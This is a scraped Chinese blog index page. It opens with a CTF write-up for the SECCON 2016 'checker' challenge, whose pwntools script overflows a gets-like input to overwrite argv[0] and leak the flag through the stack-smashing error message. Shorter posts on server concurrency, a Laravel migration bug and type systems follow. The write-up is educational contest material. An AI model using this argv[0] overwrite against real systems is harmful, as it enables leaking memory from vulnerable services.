    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 300<br>Author: bruce30262 @ BambooFox</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bit ELF, Full RELRO, 有 stack canary 和 NX , 沒 PIE.</p>
<p>程式很小，行為也很簡單:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ ./checker </span><br><span class="line">Hello! What is your name?</span><br><span class="line">NAME : 123</span><br><span class="line"></span><br><span class="line">Do you know flag?</span><br><span class="line">&gt;&gt; 123</span><br><span class="line"></span><br><span class="line">Do you know flag?</span><br><span class="line">&gt;&gt; yes</span><br><span class="line"></span><br><span class="line">Oh, Really??</span><br><span class="line">Please tell me the flag!</span><br><span class="line">FLAG : asdf</span><br><span class="line">You are a liar...</span><br></pre></td></tr></table></figure>
<p>簡單來說就是程式會讀我們的 input，然後比對 flag 內容 ( 正確的 flag 內容會存在 <code>.bss</code> section )，之後印出比對的結果。</p>
<p>程式使用自製的函式 <code>getaline()</code> 來讀 user 的 input</p>
<figure class="highlight c"><figcaption><span>getaline</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( buf &amp;&amp; read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      buf = <span class="number">0</span>;</span><br><span class="line">    *(_BYTE *)(a1 + (<span class="type">signed</span> <span class="type">int</span>)v4++) = buf; <span class="comment">// a1 = input buffer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 <code>getaline()</code> 就跟 <code>stdio.h</code> 裡面的 <code>gets()</code> 一樣，除非讀到換行，否則會一直讀下去，因此這是一個很明顯的 buffer overflow 漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./checker</span><br><span class="line">Hello! What is your name?</span><br><span class="line">NAME : 123</span><br><span class="line"></span><br><span class="line">Do you know flag?</span><br><span class="line">&gt;&gt; yes</span><br><span class="line"></span><br><span class="line">Oh, Really??</span><br><span class="line">Please tell me the flag!</span><br><span class="line">FLAG : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">You are a liar...</span><br><span class="line">*** stack smashing detected ***: ./checker terminated</span><br><span class="line">[1]    70548 abort      ./checker</span><br></pre></td></tr></table></figure>

<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>一開始想嘗試直接蓋 return address，但是因為有 canary 的關係使得這很難做到。直到看到程式印出 stack smash 的 error message 時，才突然想起可以直接蓋 <code>argv[0]</code>，將指向執行檔路徑的 char* pointer 改成存 flag 的 buffer address，之後觸發 <code>stack_chk_fail</code>，使程式印出 error message，進而 leak 出 flag 的內容:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***: [flag content] terminated</span><br></pre></td></tr></table></figure>

<p>這邊要注意的是 <code>argv[0]</code> 原本是一個 stack address，長度為 6 個 byte，而 flag 的 buffer address 位於 <code>0x6010c0</code>，長度為 3 個 byte，因此在蓋 <code>argv[0]</code> 之前要先將 <code>argv[0]</code> 作清空的動作，否則之後印 error message 時會 crash 掉。</p>
<figure class="highlight python"><figcaption><span>exp_checker.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;checker.pwn.seccon.jp&quot;</span></span><br><span class="line">PORT = <span class="number">14726</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./checker&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line"></span><br><span class="line">    pad = <span class="number">0x178</span></span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># null out argv[0]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        payload = <span class="string">&quot;A&quot;</span>*pad + <span class="string">&quot;B&quot;</span>*i</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, payload)</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;yes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite argv[0] to flag buffer</span></span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*pad + p64(<span class="number">0x6010c0</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;: &quot;</span>, payload)</span><br><span class="line">	</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>exploit 在本地端可以 work，但是之後送 remote 端時卻一直沒噴回 flag。本來以為是 padding 的問題，但是在做了一些測試之後斷定 padding 是正確的，input buffer 離 <code>argv[0]</code> 就是 376 個 byte。因此之後就是瘋狂的鬼打牆，不斷地送同樣的 payload 到 remote 端並祈禱 exploit 能夠 work。然後就在比賽結束前 3 分鐘，奇蹟發生了…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to checker.pwn.seccon.jp on port 14726: Done</span><br><span class="line">You are a liar...</span><br><span class="line">*** stack smashing detected ***: SECCON&#123;y0u_c4n&#x27;7_g37_4_5h3ll,H4h4h4&#125; terminated</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>

<p>完全無法理解 XDDD ( 明明是一模一樣的 payload 啊 ! )<br>而且在這之後不管怎麼送就是不會 work，非常詭異</p>
<p>無論如何還是驚險地拿到了這 300 分 &#x3D;w&#x3D;</p>
<p>flag: <code>SECCON&#123;y0u_c4n&#39;7_g37_4_5h3ll,H4h4h4&#125;</code></p>
<h2 id="Afterword"><a href="#Afterword" class="headerlink" title="Afterword"></a>Afterword</h2><p>之後 <strong>mike</strong> 在 trello 上有提到，如果 <code>0x6010c0</code> 是在回答 yes 之前蓋的話就會 work。或是把 <code>sendlineafter()</code> 改成 <code>sendline()</code>，之後一次 <code>recvall()</code> 也會噴回 flag。<br>至於詳細原因為何至今仍然無解……</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/2016-12-15-qps-and-concurrent-connections/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/2016-12-15-qps-and-concurrent-connections/" itemprop="url">QPS 和并发：如何衡量服务器端性能</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-15T00:00:00+08:00">
                2016-12-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p>在 LeanCloud 的控制台和文档中大家会接触到「并发连接数（Concurrent Connections）」这个衡量服务器负荷或处理能力的概念，但很多人并不了解什么是并发 —— 甚至在我们团队内部，很多没有服务器端开发经验的工程师对这个词的理解也不是很准确。我们还在继续优化文案来减少用户的困惑，但与此同时不如听我仔细介绍一下并发这个概念。</p>
<p>和并发相关不得不提的一个概念就是 QPS（Query Per Second），QPS 其实是衡量吞吐量（Throughput）的一个常用指标，就是说服务器在一秒的时间内处理了多少个请求 —— 我们通常是指 HTTP 请求，显然数字越大代表服务器的负荷越高、处理能力越强。作为参考，一个有着简单业务逻辑（包括数据库访问）的程序在单核心运行时可以提供 50 - 100 左右的 QPS，即每秒可以处理 50 - 100 个请求，LeanCloud 目前也是按照请求数量进行收费的。</p>
<p>但 QPS 只能粗略地衡量请求的数量，完全不关心服务器处理每个请求的开销。例如一个命中缓存的请求和一个需要进行多次数据库查询的请求的开销可能会有一个数量级的差距，所以 QPS 并不能十分精确地衡量服务器的负载或处理能力，因此我们引入了一个非常抽象的概念 —— 并发。</p>
<p>大部分请求的响应时间在 15 - 30 毫秒左右，这里的响应时间是指服务器处理这个请求所花费的时间，从客户端测量到的时间可能会稍长一些。想象如果服务器上只有一个 CPU 核心在逐个地在处理请求，如果每个请求花费 15 毫秒的话，那么每秒可以处理 66 个请求，也就是我们前面提到的 66 QPS；而如果都是复杂的请求，每个需要 30 毫秒的话，那么服务器就只有 33 QPS 了。可以看到在处理能力不变的情况下（只有一个核心），响应时间越高，QPS 就越低。又如果在响应时间不变的情况下，如果我们增加一个 CPU，QPS 就会翻倍，这三者之间的关系可以简单地描述成：吞吐量（QPS）&#x3D; 处理能力（CPU）&#x2F; 响应时间。</p>
<p>其实 CPU 的数量就是并发最基本的概念，即有多少个 CPU 在工作。当然在实际的服务器端环境中，我们在 CPU 的基础上建立起了进程、线程、协程这样复杂的抽象、通过异步的 IO 提高 CPU 的利用率 —— 当需要从硬盘或网络读取数据时，CPU 会去做其他工作，所以并发和 CPU 的比值会比 1 高一些，IO 越多，这个比值会越高。</p>
<p>这时我们可以观测到的并发数就是服务器在同时处理多少个请求，也即「并发连接数」。对于 Web 后端的场景来说（而不考虑推送等长链接的场景），我们希望尽快地给客户端响应，所以请求在服务器端花费的几十毫秒中每一毫秒都是必不可少的：可能是在进行计算、也可能是在向磁盘或网络读写数据，都在占用着服务器的资源，因此并发依然是衡量服务器负荷和处理能力的关键指标。</p>
<p>除了并发本身，我们还经常提到「最大并发」的概念，最大并发就是在单位时间（通常是一天）里并发最高的那一刻有多少个 CPU 在为你工作。大部分应用的请求量并不是均匀地分布在一天中的，因为用户们往往会集中在傍晚的几个小时中使用手机，这些时段中的请求量要远远高于凌晨。所以人人都希望在傍晚得到更多的计算能力，但遗憾的是这些计算能力需要原子世界中的 CPU 去支持，你不可能在傍晚购买一批服务器然后在凌晨卖掉（当然，这其实是云计算要解决的问题），所以为了支撑傍晚的高并发，我们必须去准备那么多的服务器、必须在凌晨让很多服务器闲置，因此其实我们只关心一天中最高的并发数 —— 这代表了我们需要采购多少硬件资源。</p>
<p>当然，LeanCloud 的存在就是为了帮助开发者减轻维护后端的负担，应用开发者往往更关注的是「我有 100 万用户对应多少并发」。但这个问题往往得不到一个答案，因为有太多的因素在影响着最后的结果，例如你的 100 万用户中可能并不是每个人每天都会打开你的应用（每日活跃用户比例）；而且用户对于不同类型的应用使用的频率也并不相同（平均打开次数）；不同类型的应用在工作期间发起的请求数量也不相同（平均请求数量）；对于不同类型的请求，需要占用服务器的计算能力同样不同（平均响应时间）；最后还要考虑到你的大部分用户会集中在傍晚的几个小时使用你的应用，对于游戏抽奖、电商秒杀之类的场景，用户会更加集中在几分钟内使用你的应用。前些天我根据这些指标编写了一个简单的计算器（<a target="_blank" rel="noopener" href="https://budget.leanapp.cn/">https://budget.leanapp.cn</a>），将最大并发数的计算抽象为了前面提到的几个指标，如果你能给每个指标一个相对准确的估算，那么就可以计算出一个可供参考的并发数。</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/solution-for-artisan-call-migrate-not-working-when-app-env-is-production/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/solution-for-artisan-call-migrate-not-working-when-app-env-is-production/" itemprop="url">Artisan::call('migrate') 在 APP_ENV 为 production 时不工作的解决方法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-13T22:44:11+08:00">
                2016-12-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>最近把版本库里 <code>.env.example</code> 的 <code>APP_ENV</code> 字段值从原来的 <code>local</code> 改为了 <code>production</code>，原意是为了更好的区分开发和生产环境。</p>
<p>然而今天在主机壳的虚拟主机上测试我的程序的时候（准备把演示站搬过去），却出现了奇怪的问题——数据库 Migration  不管用了。</p>
<p>我是在控制器里通过调用 <code>Artisan::call(&#39;migrate&#39;)</code> 来执行数据库迁移操作的（毕竟虚拟主机哪来的 shell 访问），但是这次这条命令竟然没有执行任何事务。</p>
<p>通过 <code>Artisan</code> 执行 <code>Command</code> 的简化流程大概是像这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Foundation\Console\Kernel</span><br><span class="line">↓</span><br><span class="line">Illuminate\Console\Application</span><br><span class="line">↓</span><br><span class="line">Illuminate\Console\Command</span><br><span class="line">↓</span><br><span class="line">Illuminate\Container\Container</span><br><span class="line">↓</span><br><span class="line">// 这个就是执行 Artisan::call(&#x27;migrate&#x27;) 时调用的类</span><br><span class="line">Illuminate\Database\Console\Migrations\MigrateCommand</span><br><span class="line">↓</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>经过一段时间的排查，最后锁定了是在 <code>MigrateCommand</code> 这个类停止继续往下执行的，即接下来的脚本都没有被执行到，也就是说问题就出在 <code>MigrateCommand</code> 这里。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/solution-for-artisan-call-migrate-not-working-when-app-env-is-production/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/SECCON-CTF-2016-Quals-jmper-300/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/SECCON-CTF-2016-Quals-jmper-300/" itemprop="url">[SECCON CTF 2016 Quals] jmper 300</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-12T11:44:00+08:00">
                2016-12-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 300<br>Solver: Naetw @ BambooFox</p>
</blockquote>
<p>這題跟 cheer_msg 其實差不多，然後解法發現也跟以前解過的 <a target="_blank" rel="noopener" href="http://train.cs.nctu.edu.tw/problems/16">applestore</a> 很像，有紀錄以前的 writeup 真是太好了，記憶障礙的時候可以回顧一下</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/SECCON-CTF-2016-Quals-jmper-300/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/SECCON-CTF-2016-Quals-Cheer-msg-100/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/SECCON-CTF-2016-Quals-Cheer-msg-100/" itemprop="url">[SECCON CTF 2016 Quals] Cheer_msg 100</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-12T08:24:00+08:00">
                2016-12-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 100<br>Solver: Naetw @ BambooFox</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>32 bit ELF, Partial RELRO, 有 canary &amp; NX, 沒有 PIE</p>
<p>程式小小的，比較少見的部分是 <code>alloca</code> 的部分，不同於平常的 <code>malloc</code>，<code>alloca</code> 是從 caller 的 stack frame 上分配記憶體，在 function call 結束時，回收記憶體。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/SECCON-CTF-2016-Quals-Cheer-msg-100/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/2016-12-12-categories-of-languages/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/2016-12-12-categories-of-languages/" itemprop="url">强弱类型、动静类型、GC 和 VM</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-12T00:00:00+08:00">
                2016-12-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="强类型-Vs-弱类型"><a href="#强类型-Vs-弱类型" class="headerlink" title="强类型 Vs. 弱类型"></a>强类型 Vs. 弱类型</h2><ul>
<li>强和弱是一个相对的概念，强是指倾向于将未定义的行为视作错误（Java、Python），弱是指倾向于进行隐式的转换、忽略类型相关的错误（JavaScript）。</li>
<li>很多设计得不够严谨的语言，虽然大多数情况下（或者我们通常鼓励大家这么做）是强类型的，但也有弱类型的部分（PHP）</li>
<li>还有的语言因为提供的抽象能力很弱，我们不得不去用弱类型的部分（C）</li>
<li>鸭子类型（duck typing）是强弱类型的一个折中（常见于动态类型中，例如 Python），兼顾了灵活性和严谨性。</li>
<li>我们认为弱类型是为了方便，而强类型是为了尽早发现错误。</li>
</ul>
<h2 id="动态类型-Vs-静态类型"><a href="#动态类型-Vs-静态类型" class="headerlink" title="动态类型 Vs. 静态类型"></a>动态类型 Vs. 静态类型</h2><ul>
<li>静态类型的变量的类型是在编译时确定的（C++、Java）；动态类型的类型是在运行时确定的（JavaScript、Python），例如你可以在一个 if 的两个分支里给一个变量赋值不同的类型。</li>
<li>有的动态类型语言也会添加编译期的类型检查（TypeScript、Python），但因为语言本身的动态性，这些检查仅能覆盖一部分情况。</li>
<li>在动态类型的语言中因为类型不那么重要，所以很多时候甚至没有提供指定类型的语法（隐含了运行时的自动推导）；而在静态类型语言里通常需要为变量指定类型，所以才有了编译期自动类型推导来提供便利，而动态类型语言则做不到这一点（因为不能在编译期确定类型，更无从推导）。</li>
<li>我们认为静态类型有助于在编译时发现有关类型的错误，确定的类型也给了编译期更多的优化空间；而动态类型给了开发者更高的灵活度。</li>
</ul>
<h2 id="垃圾回收-Vs-无垃圾回收"><a href="#垃圾回收-Vs-无垃圾回收" class="headerlink" title="垃圾回收 Vs. 无垃圾回收"></a>垃圾回收 Vs. 无垃圾回收</h2><ul>
